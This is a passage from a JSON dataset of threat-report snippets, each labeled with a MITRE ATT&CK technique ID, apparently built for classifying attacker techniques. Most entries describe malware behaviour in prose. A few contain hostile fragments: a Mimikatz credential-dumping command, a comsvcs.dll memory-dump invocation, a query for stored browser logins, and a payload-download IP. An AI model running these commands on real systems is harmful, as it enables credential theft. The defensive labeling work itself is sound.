    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The first account was the compromised Azure AD Connector account,",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can start a command shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for communications with command and control (C2) servers.(Citation: JPCert PLEAD Downloader June 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Directory listing functions",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Several  malware families collect information on the type and version of the victim OS as well as the victim computer name and CPU information. A Destover-like variant used by  also collects disk space information and sends it to its C2 server.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee GhostSecret)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has been executed via a scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can delete files and directories.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Logged Processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can inject a DLL into rundll32.exe for execution.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "enumerated the Orion software Visual Studio solution directory path.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional tools such as  malware and  to a compromised host following initial access.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can use Native API including GetProcAddress and ShellExecuteW.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is capable of configuring itself as a service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "contains an implementation of  to gather credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can use `WinAPI` to remove a victim machine from an Active Directory domain.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "collects the victim host name and serial number and then sends the information to the C2 server.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "they were looking to get valid accounts.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "adds a new service named NetAdapter to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "collects the username from the victims machine.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has performed file deletion to evade detection. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "establishes persistence through a Registry Run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can download its payload from a C2 server.(Citation: SentinelOne Lazarus macOS July 2020)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "bootkit can inject a malicious DLL into the address space of running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can secure delete its DLL.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can achieve execution through users running malicious file attachments distributed via email.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "relies on a victim to click on a malicious document for initial execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used ipconfig to identify the network configuration of a victim machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather process information.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "checks for running processes on the victims machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can determine the NetBios name and the IP addresses of targets machines including domain controllers.(Citation: Cyberreason Anchor December 2019)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can find the external IP address of the infected host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "inject Remcos RAT into a legitimate Windows process such as ieinstal.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can create a new process in a suspended state from a targeted legitimate process in order to unmap its memory and replace it with malicious code.(Citation: Cybereason Astaroth Feb 2019)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands against .(Citation: Proofpoint TA505 Jan 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "malware can download additional files from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate directories on target machines.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload and download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uploaded sensitive files information and credentials from a targeted organization for extortion or public release.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTPS in C2 communications.(Citation: SentinelOne Lazarus macOS July 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to copy files on a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional lateral movement scripts from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to create a remote shell and execute specified commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has a command to modify a Registry key.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "operating system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "IP address space",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has leveraged native OS function calls to retrieve victim's network adapter's information using GetAdapterInfo() API. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used a file stealer that can examine system drives including those other than the C drive.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "do rundll32.exe C:\\windows\\System32\\comsvcs.dll,",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The different components of  are executed by Windows Task Scheduler.(Citation: ESET Machete July 2019)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "modifies the %regrun% Registry to point itself to an autostart mechanism.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather system information from the victims machine such as the OS version machine name and drive information.(Citation: Unit42 Cannon Nov 2018)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "contains watchdog functionality that ensures its process is always running else spawns a new instance.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A module in  collects information about the paths size and creation time of files with specific file extensions but not the actual content of the file.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can use HTTP and HTTPS in C2 communications.(Citation: Talos Promethium June 2020)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can use Rundll32 to execute additional payloads.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "Get AdapterRAM and Graphic Card Name and type by executing \"root\\\\CIMV2\", \"SELECT * FROM Win32_VideoController\"",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can be executed using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "The actors used Mimikatz to harvest credentials.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has a module for performing remote desktop access.(Citation: GitHub QuasarRAT)",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It will then create a reverse shell via ncat.exe to the server",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It then performs SQL queries to retrieve files, file size, folders",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "There was a slight deviation in the November grouping, where the three samples we collected still used the Joohn author name for the last modified field but reverted to a default USER/user author name for the creator field",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has used ProcDump to dump credentials from memory.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list processes on the infected host.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can be controlled via a custom C2 protocol over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "func_GetHostSerialNumber()",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "The  loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted  binary into it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has opened the registry and performed query searches.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collects information on running processes and environment variables from the victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use WMI to delete volume shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute arbitrary commands via `cmd.exe`.(Citation: SecureWorks August 2019)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect files and information from a compromised host.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "gathers computer name and information using the systeminfo command.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "deletes any temporary files it creates",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used whoami commands to identify system owners.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "Then, it creates and sets a new value for the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete all files on the C:\\ D:\\ E:\\ and F:\\ drives using  Remove-Item commands.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can upload and download to/from a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "sets up a Registry Run key to establish a persistence mechanism.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has exfiltrated internal documents files and other data from compromised hosts.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "has used process hollowing to inject itself into legitimate Windows process.(Citation: Infoblox Lokibot January 2019) ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can query the netsvc group value data located in the svchost group Registry key. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has created scheduled tasks in %appdata%\\Roaming\\Microsoft\\Templates\\.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry key at HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell to survive a system reboot.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "subsequently download Remcos on the target system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "by modifying the Windows Registry on compromised systems.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for network communication.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can scan a directory to identify files for deletion.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "gathers information on the system and local drives.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has been delivered via malicious documents with embedded macros.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to install itself as a service to maintain persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can attempt to uninstall Kaspersky Antivirus or remove the Kaspersky license; it can also add all files and folders related to the attack to the Windows Defender exclusion list.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can collect the username from a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The  dropper can delete itself from the victim. Another  variant has the capability to delete specified files.(Citation: ESET Sednit Part 1)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can collect data from a local system.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate running processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "to run the subsequent BAT scripts",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "executes ipconfig /all after initial communication is made to the remote server.(Citation: Lotus Blossom Jun 2015)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has maintained persistence using the startup folder.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "uses the rem reg query command to obtain values from Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has executed malicious .bat files containing PowerShell commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify network settings on a compromised host.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can gather a list of processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The file collection tool used by  can utilize native API including ReadDirectoryChangeW for folder monitoring.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate network adapter information.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has relied on a victim to open a malicious attachment within an email for execution.(Citation: Check Point Warzone Feb 2020)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "can download additional files onto an infected machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can gather the victim computer name and serial number.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a “campaign identifier.” Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "gathers the computer name the serial number of the main disk volume CPU information Microsoft Windows version and runs the command systeminfo.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "contains code to delete files from the victims machine.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used the Windows API to make detection more difficult. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is capable of spawning a reverse shell on a victim.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "listing directory and file information in the format\n D|-|<Date created> |<Date modified> |<folder or file name>",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Windows API functions",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks for persistence and execution.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can use wmic process call create in a scheduled task to launch plugins and for execution.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used malware to identify the username on a compromised host.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.(Citation: McAfee Bankshot)(Citation: ClearSky Lazarus Aug 2020)(Citation: Kaspersky ThreatNeedle Feb 2021)(Citation: Lazarus APT January 2022)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from the LSASS Memory.(Citation: Deply Mimikatz)(Citation: GitHub Mimikatz lsadump Module)(Citation: Directory Services Internals DPAPI Backup Keys Oct 2015)",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Some  variants required a user to enable a macro within a malicious .xls file for execution.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "The second scheduled task created attempts to execute the payload downloaded by the other task:\n\"C:\\Windows\\System32\\schtasks.exe\" /create /sc MINUTE /mo 20 /TN",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to enumerate loaded modules for a process..",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can identify the IP address of a victim machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to identify the user name.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used  to register a scheduled task to execute malware during lateral movement.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "establishes a backdoor over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has used sc.exe to create a new service for the VirtualBox driver.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "invoking comsvcs.dll with rundll32.exe, an adversary can create a dump of any process",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Windows Command Shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "and the creation of a schedule task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "has injected a DLL backdoor into dllhost.exe and svchost.exe.(Citation: TrendMicro Tropic Trooper Mar 2018)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the script retrieves the Cobalt Strike payload",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used API functions such as `Process32First` `Process32Next` and `ShellExecuteA`.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Process Hollowing",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "using the callback function pointer in CallWindowProc",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to execute commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute a replica of itself using .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.(Citation: Kaspersky Turla)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "determines a working directory where it stores all the gathered data about the compromised machine.(Citation: ESET InvisiMole June 2018)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "batch script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect the victims IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve payloads from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "enumerates the current user during the initial infection.(Citation: Proofpoint TA505 Mar 2018)",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "NetServerGetInfoto retrieve the current configuration",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can collect the local hostname operating system details CPU speed and total physical memory. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run to establish persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can search the registry files of a compromised host.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has collected the computer name and OS version from a compromised machine.(Citation: Korean FSI TA505 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can capture and compress stolen credentials from the Registry and volume shadow copies.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The OsInfo function in  collects a running process list.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has copied and installed tools for operations once in the victim environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTPS for C2 communications.(Citation: ESET TeleBots Oct 2018)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "RDP is used by the group for lateral movement.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "may attempt to establish persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "leveraging Microsoft’s CryptoAPI",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can inject its code into a trusted process via the APC queue.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "by modifying the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "can use  and  to collect network configuration information including routing information and ARP tables.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has established persistence by writing the payload to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has used valid accounts for persistence and lateral movement.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "the threat actor began attempting to connect into the environment via VPN",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to execute shell commands on the infected host.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "One of these domains, facebook-apps[.]com, was identified in one of the malware samples associated with this IP address",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "used the startup folder for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "uses ipconfig to gather the IP address from the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` to run various commands as a reverse shell.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "used a file listing plugin to collect information about file and directories both on local and remote drives.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The data in the HTTP body is the same as the past variant,",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "deletes one of its files 2.hwp from the endpoint after establishing persistence.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "one to get processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has executed commands via scheduled tasks.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "used hard-coded credentials to gain access to a network share.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "defaultChanges the Windows Shell from Explorer to their malicious script",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Use Windows API functions",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use `cmd.exe` for execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect the host IP address from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "has used the PowerKatz plugin that can be loaded into the address space of a PowerShell process through reflective DLL loading. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the threat actors leveraged highly privileged credentials and access to domain controllers",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has stored its encrypted payload in the Registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "uses the command-line interface.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
